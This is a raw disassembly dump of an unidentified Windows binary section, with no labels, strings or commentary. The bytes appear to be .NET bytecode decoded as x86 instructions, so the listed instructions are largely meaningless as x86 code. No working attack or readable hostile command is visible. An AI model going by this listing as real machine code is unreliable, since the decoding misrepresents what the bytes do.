  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 ce             	or     -0x32(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 d4                	jb     0x403d95
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 34                	jb     0x403e06
  403dd2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 3e                	jb     0x403e20
  403de2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 4c                	jb     0x403e3e
  403df2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 d4 21 00       	and    $0x21d472,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 34                	jb     0x403e50
  403e1c:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	ec                   	in     (%dx),%al
  403e27:	21 00                	and    %eax,(%eax)
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 62                	jb     0x403eb5
  403e53:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 d4 21 00       	and    $0x21d472,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 6a                	jb     0x403ef1
  403e87:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	80 26 00             	andb   $0x0,(%esi)
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 62                	jb     0x403eff
  403e9d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 8e                	jb     0x403e69
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 62                	jb     0x403f4d
  403eeb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 62             	or     %esi,0x62(%edx)
  403f1e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 8e                	jb     0x403ebc
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 62                	jb     0x40404a
  403fe8:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 98             	or     -0x68(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 b4             	add    %dh,-0x4c(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 bc                	jb     0x404081
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 ea                	jb     0x4040fd
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 32             	add    %dh,0x32(%edx)
  404180:	27                   	daa
  404181:	00 70 73             	add    %dh,0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
